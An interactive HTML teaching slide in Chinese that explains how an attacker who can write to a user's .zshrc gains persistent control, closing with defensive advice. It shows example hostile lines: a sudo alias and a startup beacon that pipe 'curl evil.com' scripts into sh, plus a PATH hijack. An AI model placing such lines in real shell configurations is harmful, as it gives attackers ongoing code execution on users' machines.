<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>.zshrc 安全视角 · 剧组版</title>
<style>
  :root{
    --bg:#fafafa; --surface:#fff; --hair:#e2e2e2;
    --text:#1a1a1a; --muted:#9a9a9a;
    --accent:#002FA7; --accent-bg:#E6EBF5; --accent-soft:#EEF2FB;
    --warn:#D4392B; --warn-bg:#FBEDEB;
    --r-zsh:#002FA7; --r-nar:#6a6a6a; --r-att:#A32D2D;
  }
  *{box-sizing:border-box; margin:0; padding:0}
  html,body{height:100%}
  body{
    background:var(--bg); color:var(--text);
    font-family:-apple-system,"SF Pro Text","PingFang SC",sans-serif;
    display:flex; align-items:center; justify-content:center; overflow:hidden; cursor:pointer;
  }
  .slide{
    width:min(980px,95vw); height:min(660px,93vh);
    display:flex; flex-direction:column; gap:0; padding:38px 46px; position:relative;
  }
  header.sl-h{display:flex; align-items:baseline; justify-content:space-between; border-bottom:1px solid var(--hair); padding-bottom:16px; margin-bottom:14px}
  header.sl-h h1{font-size:24px; font-weight:500; letter-spacing:.2px}
  header.sl-h .crumb{font-size:12px; color:var(--muted); letter-spacing:.6px; text-transform:uppercase}
  header.sl-h .crumb b{color:var(--warn); font-weight:500}

  .stage{flex:1; display:flex; align-items:center; justify-content:center}
  .grid{display:grid; grid-template-columns:1fr 1fr; gap:14px; width:100%}
  .cell{
    border:1px solid var(--hair); background:var(--surface); padding:20px 22px;
    display:flex; flex-direction:column; gap:10px;
    opacity:0; transform:translateY(10px); transition:.4s;
    position:relative;
  }
  .cell.show{opacity:1; transform:none}
  .cell .head{display:flex; align-items:center; gap:10px}
  .cell .ic{width:28px; height:28px; stroke:var(--muted); fill:none; stroke-width:1.6; transition:stroke .3s}
  .cell .title{font-size:15px; font-weight:500; transition:color .3s}
  .cell .num{margin-left:auto; font-size:11px; color:var(--muted); letter-spacing:.4px; font-family:"SF Mono",Menlo,monospace}
  .cell .code{
    font-family:"SF Mono",Menlo,monospace; font-size:12px; color:var(--muted);
    background:#f6f6f6; padding:8px 10px; border-left:2px solid var(--hair); line-height:1.6;
  }
  .cell .desc{font-size:12.5px; color:var(--muted); line-height:1.6}
  .cell.lit{border-color:var(--warn); background:var(--warn-bg)}
  .cell.lit .ic{stroke:var(--warn)}
  .cell.lit .title{color:var(--warn)}
  .cell.lit .code{border-left-color:var(--warn); color:var(--text)}
  .cell.lit .num{color:var(--warn)}

  .dialogue{border-left:3px solid var(--r-nar); padding:14px 0 14px 18px; min-height:84px; margin-top:14px; transition:border-color .3s}
  .dialogue[data-role="narrator"]{border-color:var(--r-nar)}
  .dialogue[data-role="attacker"]{border-color:var(--r-att)}
  .speaker{font-size:13px; letter-spacing:.3px; display:flex; align-items:center; gap:7px; margin-bottom:8px; font-weight:500; color:var(--r-nar)}
  .dialogue[data-role="attacker"] .speaker{color:var(--r-att)}
  .speaker .spk-ic{width:18px; height:18px; stroke:currentColor; fill:none; stroke-width:1.7}
  .speaker .spk-nm{padding:2px 9px; border:1px solid currentColor; font-size:11px; letter-spacing:.4px}
  .type-text{font-size:18px; line-height:1.7; min-height:30px}
  .type-cursor{display:inline-block; width:9px; height:20px; background:var(--r-nar); vertical-align:-4px; margin-left:2px; animation:blink .7s step-end infinite}
  .dialogue[data-role="attacker"] .type-cursor{background:var(--r-att)}
  @keyframes blink{50%{opacity:0}}
  .continue{font-size:12px; color:var(--accent); letter-spacing:.5px; margin-top:10px; opacity:0; transition:.3s}
  .continue.show{opacity:1; animation:pulse 1.4s infinite}
  @keyframes pulse{0%,100%{opacity:.4} 50%{opacity:1}}
  .progress{position:absolute; top:14px; right:20px; display:flex; gap:4px}
  .progress .dot{width:18px; height:3px; background:var(--hair); transition:.3s}
  .progress .dot.on{background:var(--warn)}
  .replay-btn{position:absolute; bottom:14px; right:20px; background:transparent; border:1px solid var(--accent); color:var(--accent); padding:7px 16px; font-size:12px; cursor:pointer; border-radius:0; letter-spacing:.5px; text-transform:uppercase; font-family:inherit; z-index:5}
  .replay-btn:hover{background:var(--accent); color:#fff}
</style>
</head>
<body><!--nav--><div style="position:fixed;top:0;left:0;right:0;height:36px;background:#fff;border-bottom:1px solid #e2e2e2;display:flex;align-items:center;justify-content:space-between;padding:0 16px;z-index:9999;font-family:-apple-system,sans-serif;box-sizing:border-box"><a href="07-全notfound真相-交互版.html" onclick="event.stopPropagation()" style="font-size:13px;color:#002FA7;text-decoration:none;pointer-events:auto">‹ 上一页</a><a href="../../第三卷目录.html" onclick="event.stopPropagation()" style="font-size:13px;color:#9a9a9a;text-decoration:none">目录</a><a href="09-启动链-交互版.html" onclick="event.stopPropagation()" style="font-size:13px;color:#002FA7;text-decoration:none;pointer-events:auto">下一页 ›</a></div><style>body{padding-top:36px !important}</style>

<svg width="0" height="0" style="position:absolute" aria-hidden="true">
  <defs>
    <symbol id="ic-bubble" viewBox="0 0 24 24"><path d="M3 5 h18 v11 h-9 l-4 4 v-4 h-5 z" fill="none" stroke-width="1.7" stroke-linejoin="round"/></symbol>
    <symbol id="ic-lock" viewBox="0 0 24 24"><rect x="5" y="11" width="14" height="9" rx="1" fill="none" stroke-width="1.7"/><path d="M8 11 v-3 a4 4 0 0 1 8 0 v3" fill="none" stroke-width="1.7"/></symbol>
    <symbol id="ic-alias" viewBox="0 0 24 24"><path d="M4 6 h16 M4 12 h10 M4 18 h6" fill="none" stroke-width="1.7" stroke-linecap="round"/><path d="M16 12 l4 3 -4 3" fill="none" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></symbol>
    <symbol id="ic-path" viewBox="0 0 24 24"><path d="M3 7 h6 l2 2 h10 v10 h-18 z" fill="none" stroke-width="1.7" stroke-linejoin="round"/><line x1="7" y1="14" x2="13" y2="14" stroke-width="1.7" stroke-linecap="round"/></symbol>
    <symbol id="ic-link" viewBox="0 0 24 24"><path d="M9 15 a4 4 0 0 1 0-6 l2-2 a4 4 0 0 1 6 0" fill="none" stroke-width="1.7" stroke-linecap="round"/><path d="M15 9 a4 4 0 0 1 0 6 l-2 2 a4 4 0 0 1-6 0" fill="none" stroke-width="1.7" stroke-linecap="round"/></symbol>
    <symbol id="ic-loop" viewBox="0 0 24 24"><path d="M4 12 a8 8 0 0 1 14-5 M20 12 a8 8 0 0 1-14 5" fill="none" stroke-width="1.7" stroke-linecap="round"/><path d="M16 4 v4 h4 M8 20 v-4 h-4" fill="none" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></symbol>
  </defs>
</svg>

<div class="slide">
  <header class="sl-h">
    <h1>.zshrc 被盯上：写入即持久控制</h1>
    <div class="crumb">场 08 · <b>安全视角</b></div>
  </header>
  <div class="progress" id="progress"><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>

  <div class="stage">
    <div class="grid">
      <div class="cell" data-i="0">
        <div class="head"><svg class="ic"><use href="#ic-alias"/></svg><span class="title">偷换 alias</span><span class="num">01</span></div>
        <div class="code">alias sudo='curl evil.com/x.sh | sh'</div>
        <div class="desc">你每次 sudo，实际在跑我的脚本</div>
      </div>
      <div class="cell" data-i="1">
        <div class="head"><svg class="ic"><use href="#ic-path"/></svg><span class="title">PATH 劫持</span><span class="num">02</span></div>
        <div class="code">export PATH="/tmp/evil:$PATH"</div>
        <div class="desc">你敲的 ls，其实是我的木马</div>
      </div>
      <div class="cell" data-i="2">
        <div class="head"><svg class="ic"><use href="#ic-link"/></svg><span class="title">开机回连</span><span class="num">03</span></div>
        <div class="code">curl -s evil.com/beacon | sh &amp;</div>
        <div class="desc">每次开终端，悄悄连我的服务器</div>
      </div>
      <div class="cell" data-i="3">
        <div class="head"><svg class="ic"><use href="#ic-loop"/></svg><span class="title">永久持久化</span><span class="num">04</span></div>
        <div class="code"># 写入 .zshrc = 每次启动都执行</div>
        <div class="desc">一次写入，长期控制，你重装我都还在</div>
      </div>
    </div>
  </div>

  <div class="dialogue" id="dlg" data-role="narrator">
    <div class="speaker" id="spk"><svg class="spk-ic"><use href="#ic-bubble"/></svg><span class="spk-nm">场务</span></div>
    <span class="type-text" id="tt">喊 Action 开拍</span><span class="type-cursor" id="tc"></span>
    <div class="continue" id="cont">Action ▸</div>
  </div>
  <button class="replay-btn" onclick="event.stopPropagation(); reset(); advance();">NG · 再拍一条</button>
</div>

<script>
const wait = ms => new Promise(r=>setTimeout(r,ms));
const dots=[...document.querySelectorAll('#progress .dot')];
const cells=[...document.querySelectorAll('.cell')];
const dlg=document.getElementById('dlg'), spk=document.getElementById('spk'), tt=document.getElementById('tt'), cont=document.getElementById('cont');

let step=0, typing=false, typeTimer=null, pending=null, lock=false, curText='';
const TOTAL=6;

function setDots(n){ dots.forEach((d,j)=>d.classList.toggle('on', j<n)); }
function setSpeaker(role,label,icon){ dlg.dataset.role=role; spk.innerHTML='<svg class="spk-ic"><use href="#'+icon+'"/></svg><span class="spk-nm">'+label+'</span>'; }
function litCell(i){ const c=cells.find(x=>x.dataset.i==i); if(c) c.classList.add('show','lit'); }

function typeSpeak(role,label,icon,text){
  curText=text;
  return new Promise(res=>{
    pending=res; typing=true; setSpeaker(role,label,icon);
    tt.textContent=''; cont.classList.remove('show');
    let i=0;
    typeTimer=setInterval(()=>{
      tt.textContent=text.slice(0,++i);
      if(i>=text.length){ clearInterval(typeTimer); typing=false; cont.classList.add('show'); pending=null; res(); }
    },42);
  });
}
function fastFinish(){
  if(!typing) return false;
  clearInterval(typeTimer); tt.textContent=curText; typing=false; cont.classList.add('show');
  if(pending){ const r=pending; pending=null; r(); } return true;
}

async function goStep(n){
  setDots(n);
  if(n===1){
    await typeSpeak('narrator','场务','ic-bubble','这场反派登场——.zshrc 一旦被写入恶意代码，攻击者就能以你身份做事。');
  } else if(n===2){
    await typeSpeak('attacker','攻击者','ic-lock','只要我能写你的 .zshrc，你就归我了 (｀∀´)');
  } else if(n===3){
    litCell(0);
    await wait(550);
    await typeSpeak('attacker','攻击者','ic-lock','我偷换你的 sudo——你每次提权，都在跑我的脚本。');
  } else if(n===4){
    litCell(1);
    await wait(550);
    await typeSpeak('attacker','攻击者','ic-lock','我把恶意目录放 PATH 最前——你敲的 ls，其实是我的木马。');
  } else if(n===5){
    litCell(2);
    await wait(550);
    await typeSpeak('attacker','攻击者','ic-lock','每次你开终端，我让它悄悄连我的服务器，等你来送数据。');
  } else if(n===6){
    litCell(3);
    await wait(550);
    await typeSpeak('narrator','场务','ic-bubble','最狠的是持久化——一次写入，长期控制。所以 .zshrc 是安全敏感文件：只信可信来源，改完 cat 扫一眼。下一场，看看启动链怎么决定这些后门是否加载。');
    cont.textContent='Action · 下一场 ▸'; cont.classList.add('show');
  }
}

function reset(){
  step=0; lock=false;
  cells.forEach(c=>c.classList.remove('show','lit'));
  setDots(0); setSpeaker('narrator','场务','ic-bubble'); tt.textContent='喊 Action 开拍'; cont.classList.remove('show'); cont.textContent='Action ▸';
}
async function advance(){
  if(lock) return;
  if(fastFinish()) return;
  if(step>=TOTAL){ reset(); }
  step++; lock=true;
  await goStep(step);
  lock=false;
}
document.addEventListener('click', advance);
document.addEventListener('keydown', e=>{
  if(e.code==='Space'||e.code==='ArrowRight'||e.code==='Enter'){ e.preventDefault(); advance(); }
});
</script>
</body>
</html>
